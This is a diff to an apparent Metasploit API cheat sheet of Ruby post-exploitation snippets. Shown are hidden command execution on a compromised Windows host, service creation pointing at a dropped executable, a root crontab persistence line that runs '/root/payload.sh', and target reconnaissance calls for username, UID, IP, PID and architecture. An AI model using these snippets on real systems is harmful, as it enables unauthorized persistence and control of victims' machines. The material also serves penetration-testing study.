@@ -151,10 +151,21 @@
 
       proc = session.sys.process.execute("cmd.exe /c start calc.exe", nil, {'Hidden' => true})
 
-- **Executing a shell command (not meterpreter)**<br />
+- **Use backslash(s) to escape special caracters ["*\$!]**
+
+      print_status("sc create #{sname} bin= \"C:\\Users\\Desktop\\fg.exe\"")
+      proc = session.sys.process.execute("cmd.exe /c sc create #{sname} bin= \"C:\\Users\\Desktop\\fg.exe\"", nil, {'Hidden' => true})
+
+- **Executing a shell command (not meterpreter)**
 
       session.shell_command("echo \"* * * * * root /root/payload.sh\" >> /etc/crontab")
       session.shell_command("service cron reload")
+
+- **elevate session privileges before running module**<br />
+'remmenber that **end** closes loop functions.'
+
+      client.sys.config.getprivs.each do |priv|
+      end
 
 #### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md#metasploit-api-cheat-sheet)
 
@@ -213,13 +224,31 @@
       rand = Rex::Text.rand_text_alpha(8)+".log"
       print_good("#{rand} file created")
 
-- **use backslash to escape double quotes or special caracters**
+- **Read target environment variables to extact username**
 
-      print_status("sc create #{sname} bin= \"C:\\Users\\Desktop\\fg.exe\"")
+      user_name = client.fs.file.expand_path("%USERNAME%")
+      print_good("target user name: #{user_name}")
 
 - **Get current working directory**
 
       client.fs.dir.pwd
+
+- **Get Client UID**
+
+      client.sys.config.getuid
+
+- **Get target system ip address**
+
+      client.session_host
+
+- **Get target client process pid**
+
+      client.sys.process.getpid
+
+- **Get target system architecture**
+
+      arch = session.sys.config.sysinfo
+      print_good("arch: #{arch['Architecture']}")
 
 - **write to a local file**
 
